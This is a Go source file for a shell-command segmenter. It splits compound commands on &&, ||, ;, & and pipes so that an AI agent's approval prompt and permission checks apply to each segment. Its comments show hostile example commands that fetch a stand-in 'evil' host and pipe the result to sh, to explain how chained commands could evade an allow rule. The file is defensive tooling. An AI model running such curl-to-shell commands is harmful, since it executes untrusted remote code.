// Package shellseg splits a (possibly compound) shell command into its
// top-level segments — the pieces separated by &&, ||, ;, and pipes —
// while respecting quotes, escapes, and $(...)/backtick substitutions so
// a separator inside a string literal or substitution doesn't split.
//
// It is the single source of truth for "what are the distinct commands in
// this line." The agent's approval modal uses it to risk-flag each
// segment; the permissions evaluator uses it so a Bash allow-rule is
// matched per segment (a trailing `*` can't approve a chained
// `… ; curl evil | sh`). Keeping one implementation means the display and
// the security check can never drift apart.
//
// The output is suitable for matching and display — not for exact
// execution semantics. We surface what a tired human (or an over-broad
// allow rule) might miss, not reproduce a real shell parser.
package shellseg

import "strings"

// Segment is one piece of a compound command. Separator is the operator
// that PRECEDES this segment ("" for the first; "&&", "||", ";", or "|"
// thereafter).
type Segment struct {
	Text      string
	Separator string
}

// Split tokenizes cmd into trimmed, non-empty segments. Empty input (or
// input that is only separators/whitespace) yields nil.
func Split(cmd string) []Segment {
	if strings.TrimSpace(cmd) == "" {
		return nil
	}
	segments := splitOnSeparators(cmd)
	for i := range segments {
		segments[i].Text = strings.TrimSpace(segments[i].Text)
	}
	out := segments[:0]
	for _, s := range segments {
		if s.Text != "" {
			out = append(out, s)
		}
	}
	return out
}

// Texts is a convenience wrapper returning just the segment texts — the
// shape the permissions evaluator needs.
func Texts(cmd string) []string {
	segs := Split(cmd)
	out := make([]string, 0, len(segs))
	for _, s := range segs {
		out = append(out, s.Text)
	}
	return out
}

// lastNonSpaceByte returns the last non-whitespace byte of s, or 0 when s
// is empty/all whitespace. Used to tell a background `&` (separator) from
// the `&` in a `>&`/`2>&1` redirect.
func lastNonSpaceByte(s string) byte {
	for i := len(s) - 1; i >= 0; i-- {
		if s[i] != ' ' && s[i] != '\t' {
			return s[i]
		}
	}
	return 0
}

// splitOnSeparators is the tokenizer: a single-pass char scan tracking
// quote, escape, and substitution state. Returns segments with the
// separator that preceded each (empty for the first).
func splitOnSeparators(s string) []Segment {
	var (
		out      []Segment
		current  strings.Builder
		sep      = "" // the separator that came before `current`
		inSingle bool
		inDouble bool
		escape   bool
		// substitution depth — `$(...)` and backtick blocks are kept
		// intact so nested && etc. inside them don't split.
		parenDepth int
		inBack     bool
	)
	push := func() {
		out = append(out, Segment{Text: current.String(), Separator: sep})
		current.Reset()
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if escape {
			current.WriteByte(c)
			escape = false
			continue
		}
		if c == '\\' {
			current.WriteByte(c)
			escape = true
			continue
		}
		if !inSingle && !inDouble && !inBack && parenDepth == 0 {
			// Look for two-char separators first.
			if c == '&' && i+1 < len(s) && s[i+1] == '&' {
				push()
				sep = "&&"
				i++
				continue
			}
			if c == '|' && i+1 < len(s) && s[i+1] == '|' {
				push()
				sep = "||"
				i++
				continue
			}
			// A lone `&` is the background operator — a real command
			// separator (`go test & curl evil` runs both). It must be
			// split so a per-segment permission check sees the second
			// command; otherwise a trailing-`*` allow rule spans it. But
			// it is NOT a separator inside a redirect: `&>file` (next is
			// '>') or `2>&1` / `>&2` (preceding non-space char is '>') —
			// splitting those would mangle the redirect.
			if c == '&' {
				var next byte
				if i+1 < len(s) {
					next = s[i+1]
				}
				if next != '>' && lastNonSpaceByte(current.String()) != '>' {
					push()
					sep = "&"
					continue
				}
			}
			if c == ';' {
				push()
				sep = ";"
				continue
			}
			// A raw newline (outside quotes) sequences commands just like
			// `;`. Split so each line is its own segment for matching.
			if c == '\n' || c == '\r' {
				push()
				sep = ";"
				continue
			}
			if c == '|' {
				push()
				sep = "|"
				continue
			}
			if c == '$' && i+1 < len(s) && s[i+1] == '(' {
				parenDepth++
				current.WriteByte(c)
				current.WriteByte(s[i+1])
				i++
				continue
			}
			if c == '`' {
				inBack = true
				current.WriteByte(c)
				continue
			}
		}
		if parenDepth > 0 {
			if c == '(' {
				parenDepth++
			} else if c == ')' {
				parenDepth--
			}
		}
		if inBack && c == '`' {
			inBack = false
		}
		if !inDouble && !inBack && parenDepth == 0 && c == '\'' {
			inSingle = !inSingle
		}
		if !inSingle && !inBack && parenDepth == 0 && c == '"' {
			inDouble = !inDouble
		}
		current.WriteByte(c)
	}
	push()
	return out
}
